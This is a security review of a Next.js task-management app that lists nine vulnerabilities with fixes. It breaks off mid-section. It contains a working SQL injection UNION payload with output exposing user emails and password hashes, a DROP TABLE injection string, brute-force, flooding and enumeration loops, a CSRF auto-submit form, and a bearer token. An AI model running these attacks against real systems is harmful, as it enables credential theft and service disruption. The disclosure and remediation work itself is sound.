# Security & Engineering Review
**Taskboard Assessment**

**Review Date:** 2026-05-22  
**Reviewer:** Senior Security & Engineering Review  
**Classification:** Production-Grade Code Review

---

## Executive Summary

This review identified **7 critical to high-severity issues** that pose immediate security, reliability, and scalability risks. The application demonstrates foundational security practices but contains several exploitable vulnerabilities and architectural gaps that require urgent remediation before production deployment.

**Top Priority Issues:**
1. **SQL Injection in Task Search** — Direct query parameter interpolation (CRITICAL)
2. **Broken Access Control on Task PATCH/DELETE** — Missing project membership validation (CRITICAL)
3. **Credentials Hardcoded in .env** — Airtable API key and database password exposed (CRITICAL)
4. **Weak JWT Configuration** — 30-day expiration with no refresh mechanism (HIGH)
5. **Missing Rate Limiting** — All endpoints unprotected from brute force/DoS (HIGH)
6. **Insufficient Authorization Granularity** — POST endpoint missing assignee validation (HIGH)
7. **Missing Audit Logging** — No logging of security-relevant actions (HIGH)

---

## Issues by Severity

### 🔴 CRITICAL

#### 1. SQL Injection in Task Search
**Severity:** CRITICAL  
**Affected Files:** [src/app/api/projects/[id]/tasks/route.ts:27-34](src/app/api/projects/[id]/tasks/route.ts#L27-L34)  
**Affected Endpoint:** `GET /api/projects/[id]/tasks?q=`

**Technical Explanation:**
```typescript
// VULNERABLE CODE
const q = req.nextUrl.searchParams.get("q");
if (q) {
  const sql = `
    SELECT id, project_id, title, description, status, assignee_id, created_by_id, position, created_at, updated_at
    FROM tasks
    WHERE project_id = '${projectId}'
      AND (title ILIKE '%${q}%' OR description ILIKE '%${q}%')
    ORDER BY position ASC
  `;
  const tasks = await prisma.$queryRawUnsafe(sql);
}
```

curl request with issue:
curl --location 'http://localhost:3000/api/projects/cmpguy21w000jtahi8dwtzhiz/tasks?q=%25%27)%20UNION%20SELECT%20id%2Cemail%2Cname%2Cpassword_hash%2C%27todo%27%3A%3A%22TaskStatus%22%2Cnull%2Cnull%2C0%2Cnow()%2Cnow()%20FROM%20users--' \
--header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbXBndXh6dm0wMDAwdGFoaWFwdTBrazBjIiwiZW1haWwiOiJtZWVyYUB0YXNrYm9hcmQuZGV2IiwiaWF0IjoxNzc5NDUxNjA1LCJleHAiOjE3ODIwNDM2MDV9.8fJKVY_yYM0qlTCzePXkhazLVoILJ-yxp0K_NRqC-2g'

response: 

{
    "tasks": [
        {
            "id": "cmpgxgw0u0001tal9bk3a2uu3",
            "project_id": "cmpguy21w000jtahi8dwtzhiz",
            "title": "task1",
            "description": null,
            "status": "todo",
            "assignee_id": null,
            "created_by_id": "cmpguxzvm0000tahiapu0kk0c",
            "position": 0,
            "created_at": "2026-05-22T13:00:42.652Z",
            "updated_at": "2026-05-22T13:00:42.652Z"
        },
        {
            "id": "cmpguy08f0002tahibg0p8l31",
            "project_id": "kavya@example.com",
            "title": "Kavya Reddy",
            "description": "$2a$10$ubk.Q6oHd3Bt2nqDs.BDMOln7fJcEhaYhf92pVc8h/.Y0n82nEzGm",
            "status": "todo",
            "assignee_id": null,
            "created_by_id": null,
            "position": 0,
            "created_at": "2026-05-22T13:10:11.010Z",
            "updated_at": "2026-05-22T13:10:11.010Z"
        },
        {
            "id": "cmpguy0bz0003tahi80hdk7l4",
            "project_id": "dev@example.com",
            "title": "Dev Sharma",
            "description": "$2a$10$ubk.Q6oHd3Bt2nqDs.BDMOln7fJcEhaYhf92pVc8h/.Y0n82nEzGm",
            "status": "todo",
            "assignee_id": null,
            "created_by_id": null,
            "position": 0,
            "created_at": "2026-05-22T13:10:11.010Z",
            "updated_at": "2026-05-22T13:10:11.010Z"
        },
        {
            "id": "cmpguxzvm0000tahiapu0kk0c",
            "project_id": "meera@taskboard.dev",
            "title": "Meera Iyer",
            "description": "$2a$10$ubk.Q6oHd3Bt2nqDs.BDMOln7fJcEhaYhf92pVc8h/.Y0n82nEzGm",
            "status": "todo",
            "assignee_id": null,
            "created_by_id": null,
            "position": 0,
            "created_at": "2026-05-22T13:10:11.010Z",
            "updated_at": "2026-05-22T13:10:11.010Z"
        },
        {
            "id": "cmpguy04a0001tahin136nyyz",
            "project_id": "arjun@taskboard.dev",
            "title": "Arjun Rao",
            "description": "$2a$10$ubk.Q6oHd3Bt2nqDs.BDMOln7fJcEhaYhf92pVc8h/.Y0n82nEzGm",
            "status": "todo",
            "assignee_id": null,
            "created_by_id": null,
            "position": 0,
            "created_at": "2026-05-22T13:10:11.010Z",
            "updated_at": "2026-05-22T13:10:11.010Z"
        },
        {
            "id": "cmpguy0fi0004tahi1a8qioti",
            "project_id": "lina@example.com",
            "title": "Lina Joshi",
            "description": "$2a$10$ubk.Q6oHd3Bt2nqDs.BDMOln7fJcEhaYhf92pVc8h/.Y0n82nEzGm",
            "status": "todo",
            "assignee_id": null,
            "created_by_id": null,
            "position": 0,
            "created_at": "2026-05-22T13:10:11.010Z",
            "updated_at": "2026-05-22T13:10:11.010Z"
        }
    ]
}

After fixing the issue response: 

{
    "tasks": []
}


The `q` parameter is directly interpolated into the SQL query without parameterization. An attacker can inject arbitrary SQL to exfiltrate data, modify records, or escalate privileges.

**Exploit Scenario:**
```
GET /api/projects/abc/tasks?q=%' OR 1=1 OR '%'='
```
This bypasses the intended search and returns all tasks regardless of project membership.

**Attack Chain:**
```
q = "'; DROP TABLE tasks; --"
→ Query executes: DELETE tasks
→ Data loss

q = "' UNION SELECT user_id, email, name, password_hash ... FROM users --"
→ Attacker retrieves all user credentials
```

**Business Impact:**
- **Data Breach:** Unauthorized access to confidential task data across all projects
- **Data Loss:** Malicious deletion or modification of tasks
- **Compliance Violation:** GDPR/CCPA liability if user data is exfiltrated
- **Operational Impact:** Application crashes or degradation via resource exhaustion queries

**Recommended Fix:**
Use Prisma's parameterized query interface:
```typescript
// SECURE CODE
const q = req.nextUrl.searchParams.get("q");
if (q) {
  const tasks = await prisma.task.findMany({
    where: {
      projectId,
      OR: [
        { title: { search: q } },
        { description: { search: q } },
      ],
    },
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
    orderBy: [{ status: "asc" }, { position: "asc" }],
  });
  return NextResponse.json({ tasks });
}
```

Or if full-text search is needed with raw SQL, use parameterized queries:
```typescript
const tasks = await prisma.$queryRaw`
  SELECT id, project_id, title, description, status, assignee_id, created_by_id, position, created_at, updated_at
  FROM tasks
  WHERE project_id = ${projectId}
    AND (title ILIKE ${'%' + q + '%'} OR description ILIKE ${'%' + q + '%'})
  ORDER BY position ASC
`;
```

**Priority:** Deploy patch immediately — this is the highest production risk.

---

#### 2. Broken Access Control on Task PATCH/DELETE
**Severity:** CRITICAL  
**Affected Files:** [src/app/api/tasks/[id]/route.ts:16-37](src/app/api/tasks/[id]/route.ts#L16-L37)  
**Affected Endpoints:** `PATCH /api/tasks/[id]`, `DELETE /api/tasks/[id]`

**Technical Explanation:**
The PATCH endpoint retrieves a task by ID and updates it without verifying that the user is a member of the associated project:

```typescript
// VULNERABLE CODE
export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id } = await params;
  const body = await req.json().catch(() => null);
  const parsed = updateTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const existing = await prisma.task.findUnique({ where: { id } });
  if (!existing) return notFound("task not found");

  // ⚠️ NO AUTHORIZATION CHECK BEFORE UPDATE!
  const task = await prisma.task.update({
    where: { id },
    data: parsed.data,
    ...
  });
  return NextResponse.json({ task });
}
```

**Exploit Scenario:**
1. Attacker enumerates task IDs (sequential CUID format is predictable in development)
2. Attacker modifies a task belonging to a different project they don't have access to:
```bash
curl -X PATCH https://api.taskboard.com/api/tasks/cm-secret-id \
  -H "Authorization: Bearer attacker_token" \
  -H "Content-Type: application/json" \
  -d '{"status": "done", "title": "HACKED"}'
```
3. Task is successfully modified even though attacker is not a project member

**Business Impact:**
- **Data Integrity:** Attackers can modify sensitive task data
- **Confidentiality:** Attackers can read task descriptions by observing changes
- **Compliance:** Audit trail shows unauthorized modifications
- **User Trust:** Tasks disappear or change unexpectedly

**Recommended Fix:**
Add authorization check in both PATCH and DELETE:
```typescript
export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id } = await params;
  const body = await req.json().catch(() => null);
  const parsed = updateTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const existing = await prisma.task.findUnique({ 
    where: { id },
    select: { projectId: true } 
  });
  if (!existing) return notFound("task not found");

  // ✅ NEW: Verify user is a member of the project
  const membership = await getProjectMembership(user.id, existing.projectId);
  if (!membership) return forbidden("you are not a member of this project");
  if (!canEditTasks(membership.role)) {
    return forbidden("viewers cannot edit tasks");
  }

  const task = await prisma.task.update({
    where: { id },
    data: parsed.data,
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
  });
  return NextResponse.json({ task });
}
```

**Priority:** Deploy immediately — this is an active authorization bypass.

---

#### 3. Credentials Hardcoded in .env (Exposed in Git)
**Severity:** CRITICAL  
**Affected Files:** [.env](/.env)  
**Exposed Secrets:**
- `AIRTABLE_API_KEY=''`
- `DATABASE_URL` containing AWS Neon credentials

**Technical Explanation:**
Production credentials are committed to the repository. This is a fundamental security anti-pattern:

1. **Airtable API Key** is a valid personal access token (format: `pat*`) that grants full access to the Airtable base
2. **Database URL** contains the password for the PostgreSQL user `neondb_owner`
3. Both are accessible to anyone with read access to the repository

**Exploit Scenario:**
```bash
# Attacker clones/forks the repository
git clone https://github.com/user/taskboard.git
cat .env

# Now attacker has:
# - Airtable base access (can read/write/delete all tasks in Airtable)
# - Database credentials (can connect to production database)
# - Can exfiltrate user data, modify tasks, drop tables
```

**Business Impact:**
- **Data Breach:** Attacker gains direct database access
- **Supply Chain:** If repo becomes public, any downstream user gains credentials
- **Financial:** Airtable API quota exhaustion via malicious writes
- **Compliance:** HIPAA/PCI/SOC2 violations for exposed credentials

**Recommended Fix:**

1. **Immediate actions:**
   - Rotate Airtable API key immediately
   - Rotate database password immediately
   - Review git history for when credentials were first committed:
     ```bash
     git log --all --source -S "patwM9drhiUTyyyd4" -- .env
     ```
   - Force-push to remove credentials from history (coordination with team required):
     ```bash
     git filter-branch --force --index-filter \
       'git rm --cached --ignore-unmatch .env' \
       --prune-empty --tag-name-filter cat -- --all
     ```

2. **Long-term solution:**
   - Ensure `.env` is in `.gitignore`:
     ```bash
     echo ".env" >> .gitignore
     echo ".env.local" >> .gitignore
     echo ".env.*.local" >> .gitignore
     ```
   - Use environment-specific secret management:
     - **Development:** `.env.local` (gitignored)
     - **Production:** Managed secrets (AWS Secrets Manager, HashiCorp Vault)
     - **CI/CD:** GitHub Actions Secrets, GitLab Variables
   - Verify git history has no secrets:
     ```bash
     npx detect-secrets scan --baseline .secrets.baseline
     ```

**Priority:** CRITICAL — rotate credentials immediately before continuing other work.

---

### 🟠 HIGH

#### 4. Broken Access Control on Task Creation (Missing Assignee Validation)
**Severity:** HIGH  
**Affected Files:** [src/app/api/projects/[id]/tasks/route.ts:49-89](src/app/api/projects/[id]/tasks/route.ts#L49-L89)  
**Affected Endpoint:** `POST /api/projects/[id]/tasks`

**Technical Explanation:**
When creating a task, the `assigneeId` parameter is accepted without validation that the assignee is actually a member of the project:

```typescript
// VULNERABLE CODE
const task = await prisma.task.create({
  data: {
    projectId,
    title: parsed.data.title,
    description: parsed.data.description,
    status,
    assigneeId: parsed.data.assigneeId ?? null,  // ⚠️ No validation!
    createdById: user.id,
    position: (last?.position ?? -1) + 1,
  },
  ...
});
```

This allows:
1. Assigning tasks to users outside the project
2. Assigning to users who haven't accepted invitations
3. Information disclosure (confirming user IDs exist in the system)

**Exploit Scenario:**
```bash
# Attacker discovers another user's ID
# Then assigns a task to them even though they're not in the project
curl -X POST https://api.taskboard.com/api/projects/proj-123/tasks \
  -H "Authorization: Bearer attacker_token" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Secret Task",
    "assigneeId": "user-456"  // User outside this project
  }'

# Result: Task assigned to non-member, creating confusion in notification systems
```

**Business Impact:**
- **Information Disclosure:** Attackers confirm which user IDs exist
- **User Confusion:** Tasks appear for users who have no connection to the project
- **Notification Spam:** Non-members receive task notifications
- **Compliance:** Unintended visibility of task data to non-members

**Recommended Fix:**
Validate assignee membership before creating task:
```typescript
const task = await prisma.task.create({
  data: {
    projectId,
    title: parsed.data.title,
    description: parsed.data.description,
    status,
    assigneeId: parsed.data.assigneeId ?? null,
    createdById: user.id,
    position: (last?.position ?? -1) + 1,
  },
  ...
});

// ✅ NEW: Validate assignee is a project member
if (parsed.data.assigneeId) {
  const assigneeMembership = await getProjectMembership(
    parsed.data.assigneeId,
    projectId
  );
  if (!assigneeMembership) {
    return badRequest("assignee is not a member of this project");
  }
}
```

Alternative (perform check before create for better atomicity):
```typescript
export async function POST(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id: projectId } = await params;
  const membership = await getProjectMembership(user.id, projectId);
  if (!membership) return forbidden("you are not a member of this project");
  if (!canEditTasks(membership.role)) {
    return forbidden("viewers cannot create tasks");
  }

  const body = await req.json().catch(() => null);
  const parsed = createTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  // ✅ Validate assignee before creating
  if (parsed.data.assigneeId) {
    const assigneeMembership = await getProjectMembership(
      parsed.data.assigneeId,
      projectId
    );
    if (!assigneeMembership) {
      return badRequest("assignee is not a member of this project");
    }
  }

  const status = parsed.data.status ?? "todo";
  const last = await prisma.task.findFirst({
    where: { projectId, status },
    orderBy: { position: "desc" },
    select: { position: true },
  });

  const task = await prisma.task.create({
    data: {
      projectId,
      title: parsed.data.title,
      description: parsed.data.description,
      status,
      assigneeId: parsed.data.assigneeId ?? null,
      createdById: user.id,
      position: (last?.position ?? -1) + 1,
    },
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
  });

  return NextResponse.json({ task }, { status: 201 });
}
```

**Priority:** Deploy with next security patch — important but lower impact than CRITICAL issues.

---

#### 5. Weak JWT Configuration & Token Expiration
**Severity:** HIGH  
**Affected Files:** [src/lib/jwt.ts:7](src/lib/jwt.ts#L7)  

**Technical Explanation:**
Tokens are issued with a 30-day expiration with no refresh token mechanism:

```typescript
const EXPIRES_IN = "30d";  // ⚠️ Very long-lived token

export function signToken(payload: JWTPayload): string {
  return jwt.sign(payload, SECRET as string, { expiresIn: EXPIRES_IN });
}
```

Issues:
1. **Long Expiration Window:** 30 days means a stolen token grants access for a month
2. **No Refresh Mechanism:** Users cannot get fresh tokens without re-authenticating
3. **Stale Revocation:** If a user's account is compromised, it takes up to 30 days for all active tokens to expire
4. **Device Loss Scenario:** A lost device with stored JWT remains valid for 30 days

**Exploit Scenario:**
```bash
# Day 1: Attacker steals JWT from user's browser storage
# Day 1-30: Attacker uses JWT to access user's projects and modify tasks
# Day 31: JWT finally expires

# Meanwhile:
# - User's password is changed but existing JWT still works
# - User is deleted from projects but JWT still provides access
# - Device is wiped but JWT is still in attacker's cache
```

**Business Impact:**
- **Account Takeover:** Extended access window for compromised accounts
- **Compliance:** OWASP recommends 5-15 minute expiration for sensitive operations
- **User Revocation Delay:** Terminated employees retain access for up to 30 days
- **Post-Breach Recovery:** Takes significantly longer to fully contain breach

**Recommended Fix:**

Use a two-token strategy:
```typescript
// src/lib/jwt.ts
const ACCESS_TOKEN_EXPIRES = "15m";    // Short-lived access token
const REFRESH_TOKEN_EXPIRES = "7d";    // Longer-lived refresh token

export function signAccessToken(payload: JWTPayload): string {
  return jwt.sign(payload, SECRET as string, { expiresIn: ACCESS_TOKEN_EXPIRES });
}

export function signRefreshToken(payload: JWTPayload & { tokenId: string }): string {
  return jwt.sign(payload, REFRESH_SECRET as string, { expiresIn: REFRESH_TOKEN_EXPIRES });
}

export function verifyAccessToken(token: string): JWTPayload | null {
  try {
    return jwt.verify(token, SECRET as string) as JWTPayload;
  } catch {
    return null;
  }
}

export function verifyRefreshToken(token: string): (JWTPayload & { tokenId: string }) | null {
  try {
    return jwt.verify(token, REFRESH_SECRET as string) as JWTPayload & { tokenId: string };
  } catch {
    return null;
  }
}
```

Add refresh endpoint:
```typescript
// src/app/api/auth/refresh/route.ts
import { NextRequest, NextResponse } from "next/server";
import { verifyRefreshToken, signAccessToken } from "@/lib/jwt";
import { badRequest } from "@/lib/auth";

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => null);
  const refreshToken = body?.refreshToken;
  
  if (!refreshToken) {
    return badRequest("refresh token required");
  }

  const payload = verifyRefreshToken(refreshToken);
  if (!payload) {
    return badRequest("invalid or expired refresh token");
  }

  const accessToken = signAccessToken({ userId: payload.userId, email: payload.email });
  return NextResponse.json({ accessToken });
}
```

Update login to return both tokens:
```typescript
// src/app/api/auth/login/route.ts
const accessToken = signAccessToken({ userId: user.id, email: user.email });
const refreshToken = signRefreshToken({ 
  userId: user.id, 
  email: user.email,
  tokenId: user.id // Used to revoke all tokens if needed
});

return NextResponse.json({
  user: { id: user.id, email: user.email, name: user.name },
  accessToken,
  refreshToken,
});
```

Update client to use refresh tokens:
```typescript
// src/lib/api-client.ts
export async function apiFetch<T>(path: string, options: RequestInit = {}): Promise<T> {
  let token = getAccessToken();
  
  const headers = new Headers(options.headers);
  headers.set("Content-Type", "application/json");
  if (token) headers.set("Authorization", `Bearer ${token}`);

  let res = await fetch(path, { ...options, headers });

  // If access token expired, try refreshing
  if (res.status === 401) {
    const refreshToken = getRefreshToken();
    if (refreshToken) {
      const refreshed = await refreshAccessToken(refreshToken);
      if (refreshed) {
        token = refreshed;
        headers.set("Authorization", `Bearer ${token}`);
        res = await fetch(path, { ...options, headers });
      }
    }
  }

  const text = await res.text();
  const data = text ? JSON.parse(text) : null;

  if (!res.ok) {
    const message = (data && (data.error as string)) || `request failed (${res.status})`;
    throw new Error(message);
  }
  return data as T;
}

async function refreshAccessToken(refreshToken: string): Promise<string | null> {
  try {
    const res = await fetch("/api/auth/refresh", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken }),
    });
    const data = await res.json();
    if (res.ok && data.accessToken) {
      setAccessToken(data.accessToken);
      return data.accessToken;
    }
    clearSession();
    return null;
  } catch {
    return null;
  }
}
```

**Priority:** Deploy in next release — important for security posture.

---

#### 6. Missing Rate Limiting
**Severity:** HIGH  
**Affected Endpoints:** All authentication and API endpoints  
**Affected Files:** Global — affects all route handlers

**Technical Explanation:**
The application has no rate limiting, allowing:
1. Brute force attacks on authentication endpoints
2. DoS attacks by flooding endpoints with requests
3. Credential enumeration (username/email discovery)
4. Resource exhaustion (large query responses)

**Exploit Scenarios:**

**6a) Brute Force Login:**
```bash
# Attacker script
for password in $(cat wordlist.txt); do
  curl -X POST https://api.taskboard.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"user@example.com","password":"'$password'"}'
done
# No rate limit, attack succeeds in minutes
```

**6b) Denial of Service:**
```bash
# Flood the search endpoint with expensive queries
for i in {1..1000}; do
  curl "https://api.taskboard.com/api/projects/proj-123/tasks?q=$(python -c 'print("a"*10000)')" &
done
```

**6c) User Enumeration:**
```bash
# Attacker discovers which emails are registered
for email in users.txt; do
  response=$(curl -s -X POST https://api.taskboard.com/api/auth/login \
    -d '{"email":"'$email'","password":"wrong"}')
  
  if echo $response | grep -q "invalid credentials"; then
    echo "User exists: $email"
  fi
done
```

**Business Impact:**
- **Service Availability:** DoS attacks take application offline
- **Account Takeover:** Brute force attacks compromise user accounts
- **Data Exfiltration:** Expensive queries enable targeted data extraction
- **Infrastructure Costs:** Uncontrolled traffic increases hosting bills
- **Compliance:** OWASP/PCI-DSS require rate limiting on auth endpoints

**Recommended Fix:**

Use a rate limiting middleware. Install package:
```bash
npm install rate-limiter-flexible redis
```

Create rate limiter configuration:
```typescript
// src/lib/rate-limiter.ts
import { RateLimiterRedis } from "rate-limiter-flexible";
import Redis from "redis";

const redisClient = Redis.createClient({
  host: process.env.REDIS_HOST || "localhost",
  port: parseInt(process.env.REDIS_PORT || "6379"),
});

// Login attempts: 5 per 15 minutes per email
export const loginLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  points: 5,
  duration: 900, // 15 minutes
  keyPrefix: "login:",
  insuranceLimiter: new RateLimiterMemory({
    points: 5,
    duration: 900,
  }),
});

// API requests: 100 per minute per IP
export const apiLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  points: 100,
  duration: 60,
  keyPrefix: "api:",
});

// Search queries: 20 per minute per user (to prevent expensive queries)
export const searchLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  points: 20,
  duration: 60,
  keyPrefix: "search:",
});
```

Apply to auth endpoints:
```typescript
// src/app/api/auth/login/route.ts
import { NextRequest, NextResponse } from "next/server";
import { loginLimiter } from "@/lib/rate-limiter";
import { badRequest, unauthorized } from "@/lib/auth";

export async function POST(req: NextRequest) {
  const email = (await req.json().catch(() => null))?.email;
  
  // Rate limit by email
  try {
    await loginLimiter.consume(email);
  } catch (rejRes) {
    if (rejRes instanceof RateLimiterRes) {
      return NextResponse.json(
        { error: "Too many login attempts. Try again later." },
        { status: 429 }
      );
    }
  }

  // ... rest of login logic
}
```

Apply to search endpoint:
```typescript
// src/app/api/projects/[id]/tasks/route.ts
import { searchLimiter } from "@/lib/rate-limiter";

export async function GET(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  // Rate limit search queries
  try {
    await searchLimiter.consume(user.id, 1);
  } catch (rejRes) {
    if (rejRes instanceof RateLimiterRes) {
      return NextResponse.json(
        { error: "Too many search requests. Try again later." },
        { status: 429 }
      );
    }
  }

  // ... rest of search logic
}
```

**Alternative (simpler, no Redis dependency):**
Use `express-rate-limit` with memory store (suitable for small deployments):
```bash
npm install express-rate-limit
```

```typescript
// src/lib/rate-limiter.ts
import rateLimit from "express-rate-limit";

export const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,
  keyGenerator: (req) => {
    const body = req.body as { email?: string };
    return body?.email || req.ip || "unknown";
  },
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(429).json({ error: "Too many login attempts. Try again later." });
  },
});
```

**Priority:** Deploy before production launch — critical for service stability.

---

#### 7. No Audit Logging of Security-Relevant Actions
**Severity:** HIGH  
**Affected Files:** All API endpoints  
**Affected Endpoints:** All authorization-dependent endpoints

**Technical Explanation:**
The application logs no audit trail of security-relevant events:
- Who accessed what data and when
- Who modified which tasks
- Failed authorization attempts
- Failed login attempts
- Project membership changes
- Task assignments

This creates:
1. **Compliance Violations:** GDPR requires audit trails for data access
2. **Forensics Gaps:** Cannot investigate security incidents
3. **Accountability:** Cannot attribute actions to users
4. **Threat Detection:** Cannot identify suspicious patterns

**Business Impact:**
- **Compliance Failures:** SOC2/HIPAA audits will flag missing logs
- **Incident Response:** Cannot determine scope of breach
- **Legal Liability:** Cannot prove who accessed sensitive data
- **Insider Threat Detection:** Cannot identify suspicious patterns

**Recommended Fix:**

Create audit logging middleware:
```typescript
// src/lib/audit-logger.ts
import { prisma } from "./prisma";

export type AuditAction =
  | "user.login"
  | "user.logout"
  | "user.register"
  | "project.create"
  | "project.update"
  | "project.delete"
  | "project.member.add"
  | "project.member.remove"
  | "task.create"
  | "task.update"
  | "task.delete"
  | "task.assign"
  | "auth.failed"
  | "auth.unauthorized"
  | "access.denied";

export async function logAudit(
  action: AuditAction,
  userId: string | null,
  resourceType: string,
  resourceId: string,
  details: Record<string, unknown> = {},
) {
  try {
    await prisma.auditLog.create({
      data: {
        action,
        userId,
        resourceType,
        resourceId,
        details,
        ipAddress: getClientIp(),
        userAgent: getUserAgent(),
        timestamp: new Date(),
      },
    });
  } catch (err) {
    // Log to stderr instead of throwing — don't let audit logging break the app
    console.error("Audit logging failed:", err);
  }
}

function getClientIp(): string | null {
  // Extract from X-Forwarded-For, CloudFlare headers, etc.
  return null; // Implement based on your infrastructure
}

function getUserAgent(): string | null {
  // Extract from request headers
  return null; // Implement based on your infrastructure
}
```

Add `AuditLog` table to Prisma schema:
```prisma
model AuditLog {
  id            String   @id @default(cuid())
  action        String   // e.g. "task.update"
  userId        String?  @map("user_id")
  resourceType  String   @map("resource_type")
  resourceId    String   @map("resource_id")
  details       Json     @default("{}")
  ipAddress     String?  @map("ip_address")
  userAgent     String?  @map("user_agent")
  timestamp     DateTime @default(now())

  @@index([userId])
  @@index([resourceType, resourceId])
  @@index([timestamp])
  @@index([action])
  @@map("audit_logs")
}
```

Integrate into task update endpoint:
```typescript
// src/app/api/tasks/[id]/route.ts
import { logAudit } from "@/lib/audit-logger";

export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id } = await params;
  const body = await req.json().catch(() => null);
  const parsed = updateTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const existing = await prisma.task.findUnique({ 
    where: { id },
    select: { projectId: true } 
  });
  if (!existing) return notFound("task not found");

  const membership = await getProjectMembership(user.id, existing.projectId);
  if (!membership) {
    await logAudit(
      "access.denied",
      user.id,
      "task",
      id,
      { reason: "not_project_member" }
    );
    return forbidden("you are not a member of this project");
  }

  if (!canEditTasks(membership.role)) {
    await logAudit(
      "access.denied",
      user.id,
      "task",
      id,
      { reason: "insufficient_role", role: membership.role }
    );
    return forbidden("viewers cannot edit tasks");
  }

  const task = await prisma.task.update({
    where: { id },
    data: parsed.data,
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
  });

  await logAudit(
    "task.update",
    user.id,
    "task",
    id,
    { changes: parsed.data }
  );

  return NextResponse.json({ task });
}
```

**Priority:** Implement for next release — essential for compliance and incident response.

---

### 🟡 MEDIUM

#### 8. Insufficient Database Constraints
**Severity:** MEDIUM  
**Affected Files:** [prisma/schema.prisma](prisma/schema.prisma)

**Technical Explanation:**
Database schema lacks important constraints that would prevent data inconsistencies:

```prisma
model User {
  id           String   @id @default(cuid())
  email        String              // ⚠️ No UNIQUE constraint
  name         String
  passwordHash String   @map("password_hash")
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")
  @@map("users")
}
```

Issues:
1. **Duplicate Emails:** Multiple users can register with the same email via race condition
2. **Orphaned Records:** If user deletion fails midway, tasks without creator
3. **Missing NOT NULL:** email and name should be NOT NULL
4. **Missing Indexes:** Email lookups are unindexed (slow)

**Scenario:**
```
Thread 1: findFirst(where: { email }) → not found
Thread 2: findFirst(where: { email }) → not found
Thread 1: create({ email }) → success
Thread 2: create({ email }) → success (RACE CONDITION!)

Result: Two users with same email
```

**Recommended Fix:**
```prisma
model User {
  id           String   @id @default(cuid())
  email        String   @unique                // ✅ Unique constraint
  name         String   @db.VarChar(80)
  passwordHash String   @map("password_hash")
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")

  memberships    Membership[]
  ownedProjects  Project[]    @relation("ProjectOwner")
  assignedTasks  Task[]       @relation("TaskAssignee")
  createdTasks   Task[]       @relation("TaskCreator")

  @@map("users")
}

model Project {
  id          String   @id @default(cuid())
  name        String   @db.VarChar(120)
  description String?  @db.VarChar(2000)
  ownerId     String   @map("owner_id")
  createdAt   DateTime @default(now()) @map("created_at")
  updatedAt   DateTime @updatedAt @map("updated_at")

  owner       User         @relation("ProjectOwner", fields: [ownerId], references: [id], onDelete: Restrict)
  memberships Membership[]
  tasks       Task[]

  @@index([ownerId])
  @@map("projects")
}

model Membership {
  id        String   @id @default(cuid())
  userId    String   @map("user_id")
  projectId String   @map("project_id")
  role      Role     @default(member)
  createdAt DateTime @default(now()) @map("created_at")

  user    User    @relation(fields: [userId], references: [id], onDelete: Cascade)
  project Project @relation(fields: [projectId], references: [id], onDelete: Cascade)

  @@unique([userId, projectId])
  @@index([projectId])
  @@index([userId])  // ✅ Add for finding all projects of a user
  @@map("memberships")
}

model Task {
  id          String     @id @default(cuid())
  projectId   String     @map("project_id")
  title       String     @db.VarChar(200)
  description String?    @db.VarChar(5000)
  status      TaskStatus @default(todo)
  assigneeId  String?    @map("assignee_id")
  createdById String     @map("created_by_id")
  position    Int        @default(0)
  createdAt   DateTime   @default(now()) @map("created_at")
  updatedAt   DateTime   @updatedAt @map("updated_at")

  project   Project @relation(fields: [projectId], references: [id], onDelete: Cascade)
  assignee  User?   @relation("TaskAssignee", fields: [assigneeId], references: [id], onDelete: SetNull)
  createdBy User    @relation("TaskCreator", fields: [createdById], references: [id], onDelete: Cascade)

  @@index([projectId, status])
  @@index([assigneeId])  // ✅ For finding tasks assigned to a user
  @@index([createdById])
  @@map("tasks")
}
```

**Priority:** Deploy in next database migration — improves data integrity.

---

#### 9. No Cross-Site Request Forgery (CSRF) Protection
**Severity:** MEDIUM  
**Affected Files:** All mutation endpoints (POST, PATCH, DELETE)  
**Affected Endpoints:** Task creation, project updates, etc.

**Technical Explanation:**
The API accepts state-changing requests from any origin without CSRF tokens. While the application uses JWT (which is partially mitigating), CSRF protection should be layered:

```typescript
// src/app/api/projects/[id]/tasks/route.ts
export async function POST(req: NextRequest, { params }: Params) {
  // ⚠️ No CSRF validation
  // If user has JWT token in localStorage, a malicious website can:
  // 1. Make an API request from user's browser
  // 2. JWT is automatically sent (if fetch credentials are set)
  // 3. Server accepts the request
}
```

**Exploit Scenario:**
```html
<!-- attacker.com -->
<form method="POST" action="https://taskboard.com/api/projects/proj-123/tasks">
  <input name="title" value="Malicious Task">
  <input name="description" value="HACKED">
</form>
<script>
  // Send with user's JWT if they're logged in
  document.forms[0].submit();
</script>
```

**Business Impact:**
